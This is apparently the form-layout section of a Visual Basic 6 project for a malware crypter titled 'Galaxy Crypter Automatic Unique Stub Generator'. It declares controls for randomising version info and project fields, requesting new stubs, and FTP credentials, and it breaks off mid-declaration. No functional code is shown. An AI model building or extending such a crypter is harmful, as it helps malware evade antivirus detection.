VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.0#0"; "CODEJO~1.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Galaxy Crypter Automatic Unique Stub Generator"
   ClientHeight    =   6195
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   9450
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6195
   ScaleWidth      =   9450
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtLocalFile 
      Height          =   285
      Left            =   9360
      TabIndex        =   434
      Text            =   "C:\test.txt"
      Top             =   9480
      Width           =   3495
   End
   Begin VB.TextBox txtUserName 
      Height          =   285
      Left            =   9360
      TabIndex        =   433
      Top             =   8760
      Width           =   3495
   End
   Begin VB.TextBox txtHost 
      Height          =   285
      Left            =   9360
      TabIndex        =   432
      Top             =   8400
      Width           =   3495
   End
   Begin VB.TextBox txtPassword 
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   9360
      PasswordChar    =   "*"
      TabIndex        =   431
      Top             =   9120
      Width           =   3495
   End
   Begin VB.TextBox txtRemoteFile 
      Height          =   285
      Left            =   9360
      TabIndex        =   430
      Text            =   "test.txt"
      Top             =   9840
      Width           =   3495
   End
   Begin InetCtlsObjects.Inet InetFtp 
      Left            =   12840
      Top             =   120
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Request New Stubs"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   6600
      TabIndex        =   428
      Top             =   6240
      Width           =   2775
   End
   Begin XtremeSuiteControls.FlatEdit FlatEdit5 
      Height          =   255
      Left            =   4440
      TabIndex        =   426
      Top             =   6240
      Width           =   1935
      _Version        =   851968
      _ExtentX        =   3413
      _ExtentY        =   450
      _StockProps     =   77
      BackColor       =   -2147483643
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
      UseVisualStyle  =   0   'False
   End
   Begin VB.TextBox TxtMod 
      Height          =   285
      Index           =   5
      Left            =   11640
      TabIndex        =   424
      Top             =   6240
      Width           =   185
   End
   Begin RichTextLib.RichTextBox Rich4 
      Height          =   3495
      Left            =   12840
      TabIndex        =   423
      Top             =   120
      Width           =   975
      _ExtentX        =   1720
      _ExtentY        =   6165
      _Version        =   393217
      Enabled         =   -1  'True
      TextRTF         =   $"Main.frx":0000
   End
   Begin VB.TextBox Te1 
      Height          =   285
      Index           =   2
      Left            =   3120
      TabIndex        =   422
      Top             =   6720
      Width           =   185
   End
   Begin VB.TextBox Te1 
      Height          =   285
      Index           =   1
      Left            =   2880
      TabIndex        =   421
      Top             =   6720
      Width           =   185
   End
   Begin VB.TextBox Te1 
      Height          =   285
      Index           =   0
      Left            =   2640
      TabIndex        =   420
      Top             =   6720
      Width           =   185
   End
   Begin VB.TextBox Te1 
      Height          =   285
      Index           =   3
      Left            =   2400
      TabIndex        =   419
      Top             =   6720
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   15
      Left            =   9600
      TabIndex        =   417
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   14
      Left            =   9360
      TabIndex        =   416
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   13
      Left            =   9120
      TabIndex        =   415
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   12
      Left            =   8880
      TabIndex        =   414
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   11
      Left            =   8640
      TabIndex        =   413
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   10
      Left            =   8400
      TabIndex        =   412
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   9
      Left            =   8160
      TabIndex        =   411
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   8
      Left            =   7920
      TabIndex        =   410
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   7
      Left            =   7680
      TabIndex        =   409
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   6
      Left            =   7440
      TabIndex        =   408
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   5
      Left            =   7200
      TabIndex        =   407
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   4
      Left            =   6960
      TabIndex        =   406
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   3
      Left            =   6720
      TabIndex        =   405
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   2
      Left            =   6480
      TabIndex        =   404
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   1
      Left            =   6240
      TabIndex        =   403
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomPge 
      Height          =   285
      Index           =   0
      Left            =   6000
      TabIndex        =   402
      Top             =   7320
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   15
      Left            =   9600
      TabIndex        =   401
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   14
      Left            =   9360
      TabIndex        =   400
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   13
      Left            =   9120
      TabIndex        =   399
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   12
      Left            =   8880
      TabIndex        =   398
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   11
      Left            =   8640
      TabIndex        =   397
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   10
      Left            =   8400
      TabIndex        =   396
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   9
      Left            =   8160
      TabIndex        =   395
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   8
      Left            =   7920
      TabIndex        =   394
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   7
      Left            =   7680
      TabIndex        =   393
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   6
      Left            =   7440
      TabIndex        =   392
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   5
      Left            =   7200
      TabIndex        =   391
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   4
      Left            =   6960
      TabIndex        =   390
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   3
      Left            =   6720
      TabIndex        =   389
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   2
      Left            =   6480
      TabIndex        =   388
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   1
      Left            =   6240
      TabIndex        =   387
      Top             =   7680
      Width           =   185
   End
   Begin VB.TextBox RandomCtl 
      Height          =   285
      Index           =   0
      Left            =   6000
      TabIndex        =   386
      Top             =   7680
      Width           =   185
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Randomize Version Info"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   4755
      TabIndex        =   384
      Top             =   4880
      Width           =   1625
   End
   Begin VB.CommandButton Command10 
      Caption         =   "Clear Version Info"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   3120
      TabIndex        =   383
      Top             =   4880
      Width           =   1625
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   17
      Left            =   6720
      TabIndex        =   377
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   16
      Left            =   6480
      TabIndex        =   376
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   15
      Left            =   7200
      TabIndex        =   375
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   14
      Left            =   6960
      TabIndex        =   374
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   13
      Left            =   6240
      TabIndex        =   373
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   12
      Left            =   6000
      TabIndex        =   372
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   11
      Left            =   9600
      TabIndex        =   371
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   10
      Left            =   9360
      TabIndex        =   370
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   9
      Left            =   10080
      TabIndex        =   369
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   8
      Left            =   9840
      TabIndex        =   368
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   7
      Left            =   9120
      TabIndex        =   367
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   6
      Left            =   8880
      TabIndex        =   366
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   5
      Left            =   8160
      TabIndex        =   365
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   4
      Left            =   7920
      TabIndex        =   364
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   3
      Left            =   8640
      TabIndex        =   363
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   2
      Left            =   8400
      TabIndex        =   362
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   1
      Left            =   7680
      TabIndex        =   361
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomMod 
      Height          =   285
      Index           =   0
      Left            =   7440
      TabIndex        =   360
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   31
      Left            =   5040
      TabIndex        =   359
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   30
      Left            =   5280
      TabIndex        =   358
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   29
      Left            =   5520
      TabIndex        =   357
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   28
      Left            =   4800
      TabIndex        =   356
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   27
      Left            =   5520
      TabIndex        =   355
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   26
      Left            =   4560
      TabIndex        =   354
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   25
      Left            =   4560
      TabIndex        =   353
      Top             =   7800
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   24
      Left            =   5640
      TabIndex        =   352
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   23
      Left            =   7080
      TabIndex        =   351
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   22
      Left            =   7320
      TabIndex        =   350
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   21
      Left            =   7560
      TabIndex        =   349
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   20
      Left            =   6840
      TabIndex        =   348
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   19
      Left            =   6120
      TabIndex        =   347
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   18
      Left            =   6360
      TabIndex        =   346
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   17
      Left            =   6600
      TabIndex        =   345
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   16
      Left            =   5880
      TabIndex        =   344
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   15
      Left            =   4800
      TabIndex        =   343
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   14
      Left            =   5040
      TabIndex        =   342
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   13
      Left            =   5280
      TabIndex        =   341
      Top             =   8160
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   12
      Left            =   7800
      TabIndex        =   340
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   11
      Left            =   7800
      TabIndex        =   339
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   10
      Left            =   8040
      TabIndex        =   338
      Top             =   8640
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   9
      Left            =   8040
      TabIndex        =   337
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   8
      Left            =   7560
      TabIndex        =   336
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   7
      Left            =   6840
      TabIndex        =   335
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   6
      Left            =   7080
      TabIndex        =   334
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   5
      Left            =   7320
      TabIndex        =   333
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   4
      Left            =   6600
      TabIndex        =   332
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   3
      Left            =   5880
      TabIndex        =   331
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   2
      Left            =   6120
      TabIndex        =   330
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   1
      Left            =   6360
      TabIndex        =   329
      Top             =   9000
      Width           =   185
   End
   Begin VB.TextBox RandomCls 
      Height          =   285
      Index           =   0
      Left            =   5640
      TabIndex        =   328
      Top             =   9000
      Width           =   185
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Randomize All Fields"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   4755
      TabIndex        =   308
      Top             =   5400
      Width           =   1625
   End
   Begin XtremeSuiteControls.GroupBox GroupBox4 
      Height          =   2175
      Left            =   6600
      TabIndex        =   301
      Top             =   3000
      Width           =   2775
      _Version        =   851968
      _ExtentX        =   4895
      _ExtentY        =   3836
      _StockProps     =   79
      Caption         =   "Add Modules + Forms"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin VB.CommandButton Command9 
         Caption         =   "+"
         Height          =   255
         Left            =   1920
         TabIndex        =   326
         Top             =   1800
         Width           =   255
      End
      Begin VB.CheckBox Check25 
         Caption         =   "Property Page(s)"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   325
         Top             =   1800
         Width           =   1575
      End
      Begin VB.CheckBox Check22 
         Caption         =   "UserControls(s)"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   322
         Top             =   1440
         Width           =   1575
      End
      Begin VB.CommandButton Command7 
         Caption         =   "+"
         Height          =   255
         Left            =   1920
         TabIndex        =   321
         Top             =   1440
         Width           =   255
      End
      Begin VB.CommandButton Command6 
         Caption         =   "+"
         Height          =   255
         Left            =   1920
         TabIndex        =   320
         Top             =   1080
         Width           =   255
      End
      Begin VB.CommandButton Command5 
         Caption         =   "+"
         Height          =   255
         Left            =   1920
         TabIndex        =   319
         Top             =   720
         Width           =   255
      End
      Begin VB.CommandButton Command2 
         Caption         =   "+"
         Height          =   255
         Left            =   1920
         TabIndex        =   318
         Top             =   360
         Width           =   255
      End
      Begin VB.CheckBox Check16 
         Caption         =   "Form(s)"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   306
         Top             =   1080
         Width           =   1095
      End
      Begin VB.CheckBox Check2 
         Caption         =   "Module(s)"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   303
         Top             =   720
         Width           =   1215
      End
      Begin VB.CheckBox Check10 
         Caption         =   "Class Module(s)"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   240
         TabIndex        =   302
         Top             =   360
         Width           =   1695
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit1 
         Height          =   255
         Left            =   2280
         TabIndex        =   304
         Top             =   360
         Width           =   375
         _Version        =   851968
         _ExtentX        =   661
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "1"
         Alignment       =   2
         MaxLength       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit2 
         Height          =   255
         Left            =   2280
         TabIndex        =   305
         Top             =   720
         Width           =   375
         _Version        =   851968
         _ExtentX        =   661
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "1"
         Alignment       =   2
         MaxLength       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit3 
         Height          =   255
         Left            =   2280
         TabIndex        =   307
         Top             =   1080
         Width           =   375
         _Version        =   851968
         _ExtentX        =   661
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "1"
         Alignment       =   2
         MaxLength       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit4 
         Height          =   255
         Left            =   2280
         TabIndex        =   323
         Top             =   1440
         Width           =   375
         _Version        =   851968
         _ExtentX        =   661
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "1"
         Alignment       =   2
         MaxLength       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit FlatEdit6 
         Height          =   255
         Left            =   2280
         TabIndex        =   327
         Top             =   1800
         Width           =   375
         _Version        =   851968
         _ExtentX        =   661
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "1"
         Alignment       =   2
         MaxLength       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
   End
   Begin VB.TextBox TxtProj 
      Height          =   285
      Left            =   15000
      TabIndex        =   300
      Top             =   7200
      Width           =   185
   End
   Begin XtremeSuiteControls.GroupBox GroupBox2 
      Height          =   1455
      Left            =   3120
      TabIndex        =   293
      Top             =   3360
      Width           =   3255
      _Version        =   851968
      _ExtentX        =   5741
      _ExtentY        =   2566
      _StockProps     =   79
      Caption         =   "Contact Information"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
      Begin XtremeSuiteControls.FlatEdit Text7 
         Height          =   255
         Left            =   1440
         TabIndex        =   297
         Top             =   360
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit text21 
         Height          =   255
         Left            =   1440
         TabIndex        =   298
         Top             =   720
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit text18 
         Height          =   255
         Left            =   1440
         TabIndex        =   299
         Top             =   1080
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin VB.Label Label17 
         Caption         =   "Project Title"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   296
         Top             =   360
         Width           =   1575
      End
      Begin VB.Label Label16 
         Caption         =   "Compiled Name"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   295
         Top             =   1080
         Width           =   1215
      End
      Begin VB.Label Label15 
         Caption         =   "Project Name"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   120
         TabIndex        =   294
         Top             =   720
         Width           =   1095
      End
   End
   Begin XtremeSuiteControls.GroupBox GroupBox1 
      Height          =   3255
      Left            =   3120
      TabIndex        =   274
      Top             =   0
      Width           =   3255
      _Version        =   851968
      _ExtentX        =   5741
      _ExtentY        =   5741
      _StockProps     =   79
      Caption         =   "Project Make"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
      Begin XtremeSuiteControls.FlatEdit Text19 
         Height          =   255
         Left            =   1440
         TabIndex        =   283
         Top             =   2880
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit Text20 
         Height          =   255
         Left            =   1440
         TabIndex        =   284
         Top             =   2520
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit Text9 
         Height          =   255
         Left            =   1440
         TabIndex        =   285
         Top             =   2160
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit Text5 
         Height          =   255
         Left            =   1440
         TabIndex        =   286
         Top             =   1800
         Width           =   1695
         _Version        =   851968
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Alignment       =   2
         Appearance      =   2
         UseVisualStyle  =   0   'False
      End
      Begin XtremeSuiteControls.FlatEdit Text11 
         Height          =   255
         Left            =   1440
         TabIndex        =   287
         Top             =   1440
         Width           =   1695
         _Version        =   851968
